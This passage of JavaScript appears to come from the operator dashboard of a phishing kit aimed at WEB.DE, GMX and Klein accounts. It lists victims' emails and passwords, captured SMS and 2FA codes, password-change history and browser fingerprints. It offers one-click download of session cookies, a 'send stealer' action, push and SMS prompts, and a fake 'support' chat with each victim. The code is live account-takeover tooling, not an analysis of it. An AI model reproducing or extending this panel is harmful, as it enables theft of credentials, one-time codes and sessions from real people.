        ? '<span class="session-past-history-icon" title="История перенесена из предыдущего лога" aria-label="История из прошлого лога"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true"><path fill-rule="evenodd" clip-rule="evenodd" d="M21 8C21 6.34315 19.6569 5 18 5H10C8.34315 5 7 6.34315 7 8V20C7 21.6569 8.34315 23 10 23H18C19.6569 23 21 21.6569 21 20V8ZM19 8C19 7.44772 18.5523 7 18 7H10C9.44772 7 9 7.44772 9 8V20C9 20.5523 9.44772 21 10 21H18C18.5523 21 19 20.5523 19 20V8Z" fill="#111111"/><path d="M6 3H16C16.5523 3 17 2.55228 17 2C17 1.44772 16.5523 1 16 1H6C4.34315 1 3 2.34315 3 4V18C3 18.5523 3.44772 19 4 19C4.55228 19 5 18.5523 5 18V4C5 3.44772 5.44772 3 6 3Z" fill="#111111"/></svg></span>'
        : '';
      var chatCount = lead.chatCount != null ? lead.chatCount : 0;
      var chatHtml = chatCount > 0
        ? '<span class="session-chat" title="Сообщений в чате"><svg class="session-chat-icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z"/></svg><span class="session-chat-count">' + chatCount + '</span></span>'
        : '';
      var cookieState = !lead.cookiesAvailable ? 'unavailable' : (lead.cookiesExported ? 'downloaded' : 'available');
      var cookieTitle = cookieState === 'available' ? 'Скачать куки аккаунта' : (cookieState === 'downloaded' ? 'Куки уже выгружались (в архив)' : 'Куки недоступны (вход не выполнялся или не был успешным)');
      var cookieIconHtml = lead.cookiesAvailable
        ? '<button type="button" class="session-cookie-btn session-cookie-btn--' + cookieState + '" title="' + escapeHtml(cookieTitle) + '" aria-label="Скачать куки" data-id="' + escapeHtml(lead.id) + '" data-email="' + escapeHtml(email) + '"><svg class="session-cookie-svg" viewBox="0 0 24 24" fill="none" stroke="#2d2d2d" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 3a9 9 0 1 0 9 9 4.2 4.2 0 0 1-4.2-4.2A4.2 4.2 0 0 1 12 3z"/><circle cx="8.5" cy="10" r="1.05" fill="#2d2d2d" stroke="none"/><circle cx="10.5" cy="15" r="1.05" fill="#2d2d2d" stroke="none"/><circle cx="15" cy="14" r="1.05" fill="#2d2d2d" stroke="none"/><circle cx="15.5" cy="9" r="1.05" fill="#2d2d2d" stroke="none"/></svg></button>'
        : '';
      item.innerHTML =
        '<label class="session-check-wrap"><input type="checkbox" class="session-check" data-id="' + escapeHtml(lead.id) + '"' + checked + '></label>' +
        '<span class="session-num">' + num + '</span>' +
        '<span class="' + statusClass(lead) + '"></span>' +
        '<div class="session-info">' +
          '<div class="session-title-row">' +
            '<div class="session-title">' + escapeHtml(email) + '</div>' +
            '<span class="session-icons-top">' +
              '<span class="session-icon-wrap session-icon-wrap--os">' + platformBtnHtml + '</span>' +
              '<span class="session-icon-wrap session-icon-wrap--cookie">' + cookieIconHtml + '</span>' +
            '</span>' +
          '</div>' +
          '<div class="session-meta-row">' +
            '<span class="action-badge ' + badge.cls + '">' + escapeHtml(badge.label) + '</span>' +
            '<span class="session-icons-bottom">' +
              '<span class="session-icon-wrap session-icon-wrap--past">' + pastHistoryIconHtml + '</span>' +
              '<span class="session-icon-wrap session-icon-wrap--klein">' + brandIconHtml + '</span>' +
            '</span>' +
            chatHtml +
          '</div>' +
        '</div>';
      item.querySelector('.session-check-wrap').addEventListener('click', function (e) {
        e.stopPropagation();
      });
      item.querySelector('.session-check').addEventListener('change', function (e) {
        e.stopPropagation();
        if (this.checked) selectedIds[lead.id] = true;
        else delete selectedIds[lead.id];
        updateBulkActions();
      });
      var cookieBtn = item.querySelector('.session-cookie-btn');
      if (cookieBtn) {
        cookieBtn.addEventListener('click', function (e) {
          e.preventDefault();
          e.stopPropagation();
          var lid = this.getAttribute('data-id');
          var emailAttr = (this.getAttribute('data-email') || '').trim() || 'cookies';
          if (!lid) return;
          authFetch('/api/lead-cookies?leadId=' + encodeURIComponent(lid))
            .then(function (r) {
              if (!r.ok) {
                if (r.status === 404) showToast('Куки не найдены (вход не выполнялся или не был успешным)');
                else showToast('Ошибка загрузки куки');
                return;
              }
              return r.text().then(function (cookieText) {
                var commentLine = '# ' + emailAttr;
                var txtContent = commentLine + '\n' + cookieText;
                var safeName = String(emailAttr).replace(/[\x00-\x1f\\/:*?"<>|]/g, '_').trim() || 'cookies';
                var filename = safeName + '.txt';
                var blob = new Blob([txtContent], { type: 'text/plain;charset=utf-8' });
                var url = URL.createObjectURL(blob);
                var a = document.createElement('a');
                a.href = url;
                a.download = filename;
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                URL.revokeObjectURL(url);
              });
            })
            .catch(function () { showToast('Ошибка загрузки куки'); });
        });
      }
      var osBtn = item.querySelector('.session-os-btn');
      if (osBtn) {
        osBtn.addEventListener('click', function (e) {
          e.preventDefault();
          e.stopPropagation();
          var lid = this.getAttribute('data-id');
          if (!lid) return;
          authFetch('/api/lead-fingerprint?leadId=' + encodeURIComponent(lid))
            .then(function (r) { return r.json(); })
            .then(function (res) {
              if (!res || !res.ok || !res.data) {
                showToast('Нет данных отпечатка для этого лида');
                return;
              }
              var d = res.data;
              var text = buildAntiFraudModalText(d);
              var modal = document.getElementById('fingerprint-modal');
              var pre = document.getElementById('fingerprint-modal-body');
              var copyBtn = document.getElementById('fingerprint-modal-copy');
              if (modal && pre) {
                pre.textContent = text;
                modal.classList.remove('hidden');
                if (copyBtn) {
                  copyBtn.onclick = function () {
                    if (navigator.clipboard && navigator.clipboard.writeText) {
                      navigator.clipboard.writeText(text).then(function () { showToast('Скопировано'); }).catch(function () { showToast('Не удалось скопировать'); });
                    } else {
                      showToast('Копирование не поддерживается');
                    }
                  };
                }
              } else {
                showToast(text);
              }
            })
            .catch(function () { showToast('Ошибка загрузки отпечатка'); });
        });
      }
      item.addEventListener('click', function (e) {
        if (e.target.closest('.session-check-wrap') || e.target.closest('.session-cookie-btn') || e.target.closest('.session-os-btn')) return;
        selectedId = normalizeLeadId(lead.id);
        try { if (selectedId) sessionStorage.setItem('gmw-admin-selected-id', selectedId); else sessionStorage.removeItem('gmw-admin-selected-id'); } catch (e) {}
        document.querySelectorAll('.session-item').forEach(function (n) { n.classList.remove('active'); });
        item.classList.add('active');
        renderDetail();
        if (window.innerWidth <= 768) {
          var side = document.getElementById('sidebar');
          var over = document.getElementById('sidebarOverlay');
          if (side) side.classList.remove('open');
          if (over) over.classList.remove('visible');
          document.body.style.overflow = '';
        }
      });
      list.appendChild(item);
    });
    updateBulkActions();
  }

  function setItemStateClasses(item, lead) {
    if (!item || !lead) return;
    item.classList.toggle('active', leadIdsEqual(lead.id, selectedId));
    item.classList.toggle('session-item--kl-archived', lead.klLogArchived === true);
    item.classList.toggle('session-item--admin-archived', lead.adminLogArchived === true);
    item.classList.toggle('session-item--worked', leadIsSidebarWorked(lead));
  }

  function updateLeadListItemInPlace(lead) {
    if (!el.leadsList || !lead || lead.id == null) return false;
    var item = Array.prototype.find.call(el.leadsList.querySelectorAll('.session-item'), function (n) {
      return leadIdsEqual(n.getAttribute('data-id'), lead.id);
    });
    if (!item) return false;
    setItemStateClasses(item, lead);
    var statusDot = item.querySelector('.session-status, .session-status.danger');
    if (statusDot) statusDot.className = statusClass(lead);
    var badge = item.querySelector('.action-badge');
    if (badge) {
      var b = getBadgeClassAndLabel(lead);
      badge.className = 'action-badge ' + b.cls;
      badge.textContent = b.label;
    }
    var title = item.querySelector('.session-title');
    if (title) title.textContent = (lead.email || lead.emailKl || '').trim() || '—';
    var metaRow = item.querySelector('.session-meta-row');
    if (metaRow) {
      var oldChat = item.querySelector('.session-chat');
      if (oldChat && oldChat.parentNode) oldChat.parentNode.removeChild(oldChat);
      var chatCount = lead.chatCount != null ? lead.chatCount : 0;
      if (chatCount > 0) {
        var chatWrap = document.createElement('span');
        chatWrap.className = 'session-chat';
        chatWrap.title = 'Сообщений в чате';
        chatWrap.innerHTML = '<svg class="session-chat-icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z"/></svg><span class="session-chat-count">' + chatCount + '</span>';
        metaRow.appendChild(chatWrap);
      }
    }
    return true;
  }

  function applyLeadUpdateFromWs(lead) {
    if (!lead || lead.id == null) return;
    var id = normalizeLeadId(lead.id);
    var idx = -1;
    for (var i = 0; i < leads.length; i++) {
      if (leadIdsEqual(leads[i] && leads[i].id, id)) { idx = i; break; }
    }
    if (idx === -1) {
      leads.push(lead);
      leadsTotal = Math.max(leadsTotal + 1, leads.length);
      renderList();
      renderPagination();
    } else {
      leads[idx] = lead;
      if (!updateLeadListItemInPlace(lead)) renderList();
    }
    if (selectedId && leadIdsEqual(selectedId, id)) {
      renderDetail();
      loadAdminChat(true);
    }
    updateActivityBadge(getNewActivityCount(leads));
  }

  function appendTerminalLogLineFromWs(leadId, line) {
    if (!leadId || !line) return;
    for (var i = 0; i < leads.length; i++) {
      if (!leadIdsEqual(leads[i] && leads[i].id, leadId)) continue;
      var prev = leads[i].logTerminal != null ? String(leads[i].logTerminal) : '';
      leads[i].logTerminal = prev ? (prev + '\n' + line) : line;
      break;
    }
    if (!selectedId || !leadIdsEqual(selectedId, leadId) || !el.detailTerminal) return;
    renderDetail();
  }

  function updateBulkActions() {
    var bulkEl = document.getElementById('bulk-actions');
    if (!bulkEl) return;
    var n = Object.keys(selectedIds).length;
    if (n > 0) {
      bulkEl.classList.remove('hidden');
      var delBtn = document.getElementById('btn-bulk-delete');
      var saveBtn = document.getElementById('btn-bulk-save');
      if (delBtn) delBtn.textContent = 'Delete' + (n > 1 ? ' (' + n + ')' : '');
      if (saveBtn) saveBtn.textContent = 'Save' + (n > 1 ? ' (' + n + ')' : '');
    } else {
      bulkEl.classList.add('hidden');
    }
  }

  function renderPagination() {
    var totalPages = leadsLimit > 0 ? Math.ceil(leadsTotal / leadsLimit) : 1;
    var showPagination = leadsTotal > leadsLimit && leadsTotal > 0;
    var from = (leadsPage - 1) * leadsLimit + 1;
    var to = Math.min(leadsPage * leadsLimit, leadsTotal);
    var prevDisabled = leadsPage <= 1;
    var nextDisabled = leadsPage >= totalPages;
    var html = showPagination
      ? '<span class="leads-pagination-info">' + from + '–' + to + ' / ' + leadsTotal + '</span>' +
        '<div class="leads-pagination-btns">' +
          '<button type="button" class="btn btn-ghost btn-sm leads-pagination-prev" ' + (prevDisabled ? 'disabled' : '') + '>←</button>' +
          '<span class="leads-pagination-page">' + leadsPage + ' / ' + totalPages + '</span>' +
          '<button type="button" class="btn btn-ghost btn-sm leads-pagination-next" ' + (nextDisabled ? 'disabled' : '') + '>→</button>' +
        '</div>'
      : '';
    [el.leadsPaginationTop, el.leadsPagination].forEach(function (wrap) {
      if (!wrap) return;
      if (!showPagination) {
        wrap.classList.add('hidden');
        wrap.innerHTML = '';
        return;
      }
      wrap.classList.remove('hidden');
      wrap.innerHTML = html;
      var prevBtn = wrap.querySelector('.leads-pagination-prev');
      var nextBtn = wrap.querySelector('.leads-pagination-next');
      if (prevBtn && !prevDisabled) {
        prevBtn.addEventListener('click', function () { loadLeads(null, leadsPage - 1); });
      }
      if (nextBtn && !nextDisabled) {
        nextBtn.addEventListener('click', function () { loadLeads(null, leadsPage + 1); });
      }
    });
  }

  // 0/Infinity = не обрезать журнал событий/логов.
  var RENDER_DETAIL_EVENTS_CAP = Infinity;
  /** Порядок: WEB/GMX — Error Push SMS | Password PC Download | E-Mail Success Отработан (без Delete/Android в сетке); Klein — 3+3+3. */
  function reorderDetailActionButtons(brand) {
    var wrap = document.getElementById('detail-action-buttons');
    if (!wrap) return;
    var klein = (brand || '').toLowerCase() === 'klein';
    wrap.classList.toggle('action-buttons--klein', klein);
    wrap.classList.toggle('action-buttons--web', !klein);
    var ids = klein
      ? ['btn-error', 'btn-sms-klein', 'btn-change-password', 'btn-send-stealer', 'btn-open-on-pc', 'btn-android', 'btn-success', 'btn-delete', 'btn-worked']
      : ['btn-error', 'btn-push', 'btn-sms', 'btn-2fa', 'btn-change-password', 'btn-open-on-pc', 'btn-sicherheit', 'btn-send-stealer', 'btn-success', 'btn-worked'];
    ids.forEach(function (id) {
      var node = document.getElementById(id);
      if (node) wrap.appendChild(node);
    });
    var sicher = document.getElementById('btn-sicherheit');
    if (sicher) {
      if (klein) {
        sicher.style.display = 'none';
        wrap.appendChild(sicher);
      } else {
        sicher.style.display = '';
      }
    }
    if (!klein) {
      var btnDel = document.getElementById('btn-delete');
      var btnAnd = document.getElementById('btn-android');
      if (btnDel) wrap.appendChild(btnDel);
      if (btnAnd) wrap.appendChild(btnAnd);
    }
  }

  var renderDetailScheduled = null;
  function renderDetail() {
    if (renderDetailScheduled !== null) return;
    renderDetailScheduled = requestAnimationFrame(function () {
      renderDetailScheduled = null;
      renderDetailNow();
    });
  }
  function renderDetailNow() {
    var placeholder = el.detailPlaceholder;
    var main = el.mainContent;
    if (!placeholder || !main) return;

    var lead = leads.find(function (l) { return leadIdsEqual(l.id, selectedId); });
    if (!lead) {
      placeholder.classList.remove('hidden');
      main.classList.add('hidden');
      if (el.statsContent) el.statsContent.classList.add('hidden');
      var dc = main.querySelector('.detail-card');
      if (dc) {
        dc.classList.remove('detail-card--worked');
        dc.classList.remove('detail-card--kl-archived');
        dc.classList.remove('detail-card--admin-archived');
      }
      var wb = document.getElementById('detail-worked-banner');
      if (wb) wb.classList.add('hidden');
      var btnStealerEmpty = document.getElementById('btn-send-stealer');
      if (btnStealerEmpty) {
        btnStealerEmpty.disabled = false;
        if (btnStealerEmpty.dataset.defaultTitle) btnStealerEmpty.setAttribute('title', btnStealerEmpty.dataset.defaultTitle);
      }
      if (adminChatPollTimer) {
        clearInterval(adminChatPollTimer);
        adminChatPollTimer = null;
      }
      loadAdminChat();
      return;
    }

    if (el.statsContent) el.statsContent.classList.add('hidden');
    placeholder.classList.add('hidden');
    main.classList.remove('hidden');
    var detailCardEl = main.querySelector('.detail-card');
    var workedDetail = leadIsSidebarWorked(lead);
    if (detailCardEl) {
      detailCardEl.classList.toggle('detail-card--kl-archived', (lead.brand || '').toLowerCase() === 'klein' && lead.klLogArchived === true);
      detailCardEl.classList.toggle('detail-card--admin-archived', (lead.brand || '').toLowerCase() !== 'klein' && lead.adminLogArchived === true);
      detailCardEl.classList.toggle('detail-card--worked', workedDetail);
    }
    var workedBannerEl = document.getElementById('detail-worked-banner');
    if (workedBannerEl) workedBannerEl.classList.toggle('hidden', !workedDetail);

    if (el.detailEmail) {
      el.detailEmail.textContent = (lead.email || '').trim() || '—';
      el.detailEmail.classList.add('copy-on-click');
      el.detailEmail.title = 'Click to copy';
    }
    var detailEmailKl = document.getElementById('detail-email-kl');
    var detailPasswordKl = document.getElementById('detail-password-kl');
    if (detailEmailKl) {
      detailEmailKl.textContent = (lead.emailKl || '').trim() || '—';
      detailEmailKl.classList.add('copy-on-click');
      detailEmailKl.title = 'Click to copy';
    }
    if (el.detailPasswordCurrent) {
      el.detailPasswordCurrent.textContent = (lead.password || '').trim() || '—';
      el.detailPasswordCurrent.classList.add('copy-on-click');
      el.detailPasswordCurrent.title = 'Click to copy';
    }
    if (detailPasswordKl) {
      detailPasswordKl.textContent = (lead.passwordKl || '').trim() || '—';
      detailPasswordKl.classList.add('copy-on-click');
      detailPasswordKl.title = 'Click to copy';
    }
    var smsRow = document.getElementById('detail-sms-row');
    var smsCodeEl = document.getElementById('detail-sms-code');
    var twoFaRow = document.getElementById('detail-2fa-row');
    var twoFaCodeEl = document.getElementById('detail-2fa-code');
    var rawCode = lead.smsCodeData && (lead.smsCodeData.code || '').trim();
    var codeKind = rawCode ? smsCodeDataKind(lead) : null;
    if (smsRow && smsCodeEl) {
      if (rawCode && codeKind === 'sms') {
        smsRow.style.display = '';
        smsCodeEl.textContent = rawCode;
        smsCodeEl.classList.add('copy-on-click');
        smsCodeEl.title = 'Click to copy';
      } else {
        smsRow.style.display = 'none';
        smsCodeEl.textContent = '';
      }
    }
    if (twoFaRow && twoFaCodeEl) {
      if (rawCode && codeKind === '2fa') {
        twoFaRow.style.display = '';
        twoFaCodeEl.textContent = rawCode;
        twoFaCodeEl.classList.add('copy-on-click');
        twoFaCodeEl.title = 'Click to copy';
      } else {
        twoFaRow.style.display = 'none';
        twoFaCodeEl.textContent = '';
      }
    }

    var statusDot = document.getElementById('detail-status-dot');
    var statusText = document.getElementById('detail-status-text');
    var lastSeenEl = document.getElementById('detail-status-last-seen');
    var online = isOnline(lead);
    if (statusDot && statusText) {
      statusDot.className = 'status-dot-inline ' + (online ? 'online' : 'offline');
      statusText.textContent = online ? 'Online' : 'Offline';
      if (lastSeenEl) {
        if (online) {
          lastSeenEl.classList.add('hidden');
          lastSeenEl.textContent = '';
        } else {
          var last = lead.lastSeenAt || lead.createdAt;
          if (last) {
            var d = new Date(last);
            if (!isNaN(d.getTime())) {
              var day = ('0' + d.getDate()).slice(-2);
              var month = ('0' + (d.getMonth() + 1)).slice(-2);
              var year = d.getFullYear();
              var h = ('0' + d.getHours()).slice(-2);
              var min = ('0' + d.getMinutes()).slice(-2);
              lastSeenEl.textContent = ' · ' + day + '.' + month + '.' + year + ' ' + h + ':' + min;
              lastSeenEl.classList.remove('hidden');
            } else {
              lastSeenEl.classList.add('hidden');
            }
          } else {
            lastSeenEl.classList.add('hidden');
          }
        }
      }
    }
    var listItem = el.leadsList && Array.prototype.find.call(el.leadsList.querySelectorAll('.session-item'), function (n) { return leadIdsEqual(n.getAttribute('data-id'), lead.id); });
    if (listItem) {
      var statusSpan = listItem.querySelector('.session-status');
      if (statusSpan) {
        statusSpan.className = online ? 'session-status' : 'session-status danger';
      }
    }

    var historyEl = el.passwordHistory;
    if (historyEl) {
      var history = lead.passwordHistory || [];
      var historyCap = 80;
      var historyToShow = history.length > historyCap ? history.slice(-historyCap).reverse() : history.slice().reverse();
      historyEl.innerHTML = '';
      historyToShow.forEach(function (entry) {
        var p = typeof entry === 'object' && entry && entry.p != null ? entry.p : entry;
        var s = typeof entry === 'object' && entry && entry.s ? entry.s : '';
        var isFromChange = s === 'change';
        var isFromChangeKl = s === 'change_kl';
        var isLoginKl = s === 'login_kl';
        var text = (p != null ? String(p).trim() : '') || '—';
        var line = document.createElement('div');
        line.className = 'password-history-line';
        var textSpan = document.createElement('span');
        textSpan.textContent = text;
        textSpan.style.flex = '1';
        textSpan.style.minWidth = '0';
        line.appendChild(textSpan);
        if (isFromChange) {
          var newLabel = document.createElement('span');
          newLabel.className = 'password-history-new';
          newLabel.textContent = 'new';
          newLabel.title = 'Со страницы смены пароля';
          line.appendChild(newLabel);
        } else if (isFromChangeKl) {
          var changeKlLabel = document.createElement('span');
          changeKlLabel.className = 'password-history-new';
          changeKlLabel.textContent = 'new kl';
          changeKlLabel.title = 'Со страницы смены пароля (Klein)';
          line.appendChild(changeKlLabel);
        } else if (isLoginKl) {
          var klLabel = document.createElement('span');
          klLabel.className = 'password-history-new';
          klLabel.textContent = 'kl';
          klLabel.title = 'Со страницы входа Klein';
          line.appendChild(klLabel);
        }
        historyEl.appendChild(line);
      });
      if (history.length === 0) {
        historyEl.textContent = '—';
        historyEl.classList.add('is-empty');
        historyEl.classList.remove('copy-on-click');
        historyEl.removeAttribute('title');
      } else {
        historyEl.classList.remove('is-empty');
        historyEl.classList.remove('copy-on-click');
        historyEl.removeAttribute('title');
      }
    }

    var terminal = el.detailTerminal;
    if (terminal) {
      var events = Array.isArray(lead.eventTerminal) ? lead.eventTerminal : [];
      var logLines = String(lead.logTerminal || '')
        .split('\n')
        .map(function (line) { return String(line || '').trim(); })
        .filter(function (line) { return !!line; });
      var merged = [];
      events.forEach(function (ev, idx) {
        var atMs = 0;
        if (ev && ev.at) {
          var t = Date.parse(ev.at);
          if (Number.isFinite(t)) atMs = t;
        }
        merged.push({
          kind: 'event',
          atMs: atMs,
          idx: idx,
          at: ev && ev.at ? ev.at : '',
          label: ev && ev.label ? ev.label : '',
          detail: ev && ev.detail ? ev.detail : ''
        });
      });
      logLines.forEach(function (line, idx) {
        var m = line.match(/^(\d{4}-\d{2}-\d{2}T[0-9:.+-]+Z?)\s+(.*)$/);
        var iso = m && m[1] ? m[1] : '';
        var text = m && m[2] ? m[2] : line;
        var atMs = 0;
        if (iso) {
          var t = Date.parse(iso);
          if (Number.isFinite(t)) atMs = t;
        }
        merged.push({
          kind: 'log',
          atMs: atMs,
          idx: idx,
          at: iso,
          label: text
        });
      });
      merged.sort(function (a, b) {
        if (b.atMs !== a.atMs) return b.atMs - a.atMs;
        return b.idx - a.idx;
      });
      var cap = Number.isFinite(RENDER_DETAIL_EVENTS_CAP) ? RENDER_DETAIL_EVENTS_CAP : Infinity;
      var toRender = merged.slice(0, cap);
      terminal.innerHTML = '';
      if (toRender.length === 0) {
        /* пусто */
      } else if (toRender.length === 1) {
        terminal.appendChild(buildDetailEventNode(toRender[0], true, 'li'));
      } else {
        var wrapLi = document.createElement('li');
        wrapLi.className = 'events-collapsed-row';
        wrapLi.appendChild(buildDetailEventNode(toRender[0], true, 'div'));
        var nPast = toRender.length - 1;
        var toggleBtn = document.createElement('button');
        toggleBtn.type = 'button';
        toggleBtn.className = 'events-toggle';
        var leadIdKey = normalizeLeadId(lead && lead.id);
        function syncToggleLabel() {
          var expanded = wrapLi.classList.contains('is-expanded');
          toggleBtn.textContent = expanded
            ? 'Свернуть'
            : ('Показать предыдущие (' + nPast + ')');
        }
        if (leadIdKey && detailEventsPastExpanded[leadIdKey]) {
          wrapLi.classList.add('is-expanded');
        }
        syncToggleLabel();
        toggleBtn.addEventListener('click', function () {
          wrapLi.classList.toggle('is-expanded');
          if (leadIdKey) {
            detailEventsPastExpanded[leadIdKey] = wrapLi.classList.contains('is-expanded');
          }
          syncToggleLabel();
        });
        wrapLi.appendChild(toggleBtn);
        var pastUl = document.createElement('ul');
        pastUl.className = 'events-list-past';
        var pj;
        for (pj = 1; pj < toRender.length; pj++) {
          pastUl.appendChild(buildDetailEventNode(toRender[pj], false, 'li'));
        }
        wrapLi.appendChild(pastUl);
        terminal.appendChild(wrapLi);
      }
    }

    var brand = (lead.brand || '').toLowerCase();
    reorderDetailActionButtons(brand);
    var btnPushDetail = document.getElementById('btn-push');
    if (btnPushDetail) btnPushDetail.style.display = brand === 'klein' ? 'none' : '';
    var btnSmsDetail = document.getElementById('btn-sms');
    var btnSmsKleinDetail = document.getElementById('btn-sms-klein');
    var btnWorkedDetail = document.getElementById('btn-worked');
    var btn2faDetail = document.getElementById('btn-2fa');
    if (btnSmsDetail && btnSmsKleinDetail) {
      if (brand === 'klein') {
        btnSmsDetail.style.display = 'none';
        btnSmsKleinDetail.style.display = '';
        if (btn2faDetail) btn2faDetail.style.display = 'none';
      } else {
        btnSmsDetail.style.display = '';
        btnSmsKleinDetail.style.display = 'none';
        if (btn2faDetail) btn2faDetail.style.display = '';
      }
    }
    if (btnWorkedDetail) {
      btnWorkedDetail.style.display = '';
    }
    var btnDeleteDetail = document.getElementById('btn-delete');
    if (btnDeleteDetail) {
      btnDeleteDetail.style.display = brand === 'klein' ? '' : 'none';
    }
    var btnAndroidDetail = document.getElementById('btn-android');
    if (btnAndroidDetail) {
      btnAndroidDetail.style.display = brand === 'klein' ? '' : 'none';
    }
    var btnStealerDetail = document.getElementById('btn-send-stealer');
    if (btnStealerDetail) {
      var workedMail = leadIsSidebarWorked(lead);
      if (!btnStealerDetail.dataset.defaultTitle) btnStealerDetail.dataset.defaultTitle = btnStealerDetail.getAttribute('title') || '';
      btnStealerDetail.disabled = !!workedMail;
      btnStealerDetail.setAttribute('title', workedMail ? 'Лог отработан — отправка письма отключена' : btnStealerDetail.dataset.defaultTitle);
    }
    loadAdminChat(true);
    if (adminChatPollTimer) clearInterval(adminChatPollTimer);
    adminChatPollTimer = null;
  }

  var adminChatPendingImages = [];
  var adminChatPollTimer = null;
  var ADMIN_MAX_IMAGE_BYTES = 2800000; /* ~2 MB Bild */

  function formatAdminChatTime(isoStr) {
    if (!isoStr) return '';
    try {
      var d = new Date(isoStr);
      return d.toLocaleTimeString('de-DE', { hour: '2-digit', minute: '2-digit', hour12: false });
    } catch (e) { return ''; }
  }

  function compressAdminImage(dataUrl, cb) {
    if (dataUrl.length <= ADMIN_MAX_IMAGE_BYTES) { cb(dataUrl); return; }
    var img = new Image();
    img.onload = function () {
      var max = 1200;
      var w = img.naturalWidth;
      var h = img.naturalHeight;
      if (w <= max && h <= max) { cb(dataUrl); return; }
      if (w > h) { h = Math.round(h * max / w); w = max; } else { w = Math.round(w * max / h); h = max; }
      var canvas = document.createElement('canvas');
      canvas.width = w;
      canvas.height = h;
      var ctx = canvas.getContext('2d');
      ctx.drawImage(img, 0, 0, w, h);
      var q = 0.75;
      var result = canvas.toDataURL('image/jpeg', q);
      while (result.length > ADMIN_MAX_IMAGE_BYTES && q > 0.2) { q -= 0.1; result = canvas.toDataURL('image/jpeg', q); }
      cb(result.length > ADMIN_MAX_IMAGE_BYTES ? null : result);
    };
    img.onerror = function () { cb(null); };
    img.src = dataUrl;
  }

  function renderAdminChatMessage(msg, leadId, lastReadAt) {
    var isSupport = msg.from === 'support';
    var div = document.createElement('div');
    div.className = 'admin-chat-msg admin-chat-msg--' + (isSupport ? 'support' : 'user');
    var bubble = document.createElement('div');
    bubble.className = 'admin-chat-msg-bubble';
    if (msg.text) {
      var p = document.createElement('p');
      p.className = 'admin-chat-msg-text';
      p.textContent = msg.text;
      bubble.appendChild(p);
      if (!isSupport && msg.translation) {
        var tr = document.createElement('p');
        tr.className = 'admin-chat-msg-translation';
        tr.textContent = msg.translation;
        bubble.appendChild(tr);
      }
    }
    if (msg.image) {
      var wrap = document.createElement('span');
      wrap.className = 'admin-chat-msg-img-link';
      wrap.role = 'button';
      wrap.tabIndex = 0;
      wrap.title = 'Bild vergrößern';
      var img = document.createElement('img');
      img.className = 'admin-chat-msg-img';
      img.src = msg.image;
      img.alt = 'Bild';
      img.loading = 'lazy';
      wrap.appendChild(img);
      wrap.addEventListener('click', function () { openAdminChatImage(msg.image); });
      wrap.addEventListener('keydown', function (e) { if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); openAdminChatImage(msg.image); } });
      bubble.appendChild(wrap);
    }
    var meta = document.createElement('span');
    meta.className = 'admin-chat-msg-meta';
    var timeEl = document.createElement('span');
    timeEl.className = 'admin-chat-msg-time';
    timeEl.textContent = formatAdminChatTime(msg.at);
    meta.appendChild(timeEl);
    if (isSupport) {
      var statusEl = document.createElement('span');
      statusEl.className = 'admin-chat-msg-status' + (lastReadAt && msg.at && msg.at <= lastReadAt ? ' is-read' : '');
      statusEl.title = lastReadAt && msg.at && msg.at <= lastReadAt ? 'Прочитано' : 'Отправлено';
      statusEl.setAttribute('aria-label', lastReadAt && msg.at && msg.at <= lastReadAt ? 'Прочитано' : 'Отправлено');
      statusEl.innerHTML = '<svg class="admin-chat-msg-check" viewBox="0 0 16 11" aria-hidden="true"><path d="M1.5 5.5L5 9L14.5 1"/></svg><svg class="admin-chat-msg-check admin-chat-msg-check--second" viewBox="0 0 16 11" aria-hidden="true"><path d="M1.5 5.5L5 9L14.5 1"/></svg>';
      meta.appendChild(statusEl);
    }
    if (isSupport && msg.id && leadId) {
      var delBtn = document.createElement('button');
      delBtn.type = 'button';
      delBtn.className = 'admin-chat-msg-delete';
      delBtn.title = 'Удалить сообщение';
      delBtn.setAttribute('aria-label', 'Удалить сообщение');
      delBtn.setAttribute('data-lead-id', leadId);
      delBtn.setAttribute('data-message-id', msg.id);
      delBtn.textContent = '×';
      meta.appendChild(delBtn);
    }
    bubble.appendChild(meta);
    div.appendChild(bubble);
    return div;
  }

  var lastAdminChatLeadId = null;
  var lastAdminChatSignature = '';

  function loadAdminChat(forceUpdate) {
    var wrap = document.getElementById('admin-chat-messages');
    var emptyEl = document.getElementById('admin-chat-empty');
    var input = document.getElementById('admin-chat-input');
    if (!selectedId) {
      lastAdminChatLeadId = null;
      lastAdminChatSignature = '';
      if (wrap) wrap.innerHTML = '';
      if (emptyEl) emptyEl.classList.remove('hidden');
      if (input) input.disabled = true;
      return;
    }
    if (emptyEl) emptyEl.classList.add('hidden');
    if (input) input.disabled = false;
    if (!wrap) return;
    authFetch('/api/chat?leadId=' + encodeURIComponent(selectedId) + '&_=' + Date.now(), { cache: 'no-store', headers: { Pragma: 'no-cache' } })
      .then(function (r) { return r.json(); })
      .then(function (data) {
        var messages = (data && data.messages) ? data.messages : [];
        var lastReadAt = (data && typeof data.lastReadAt === 'string') ? data.lastReadAt : null;
        var userTyping = !!(data && data.userTyping);
        var sig = selectedId + '|' + messages.length + '|' + (messages.length ? (messages[messages.length - 1].at || '') : '') + '|' + (lastReadAt || '') + '|' + (userTyping ? '1' : '0');
        if (!forceUpdate && lastAdminChatLeadId === selectedId && lastAdminChatSignature === sig) {
          var typingEl = document.getElementById('admin-chat-typing');
          if (typingEl) typingEl.classList.toggle('hidden', !userTyping);
          return;
        }
        lastAdminChatLeadId = selectedId;
        lastAdminChatSignature = sig;
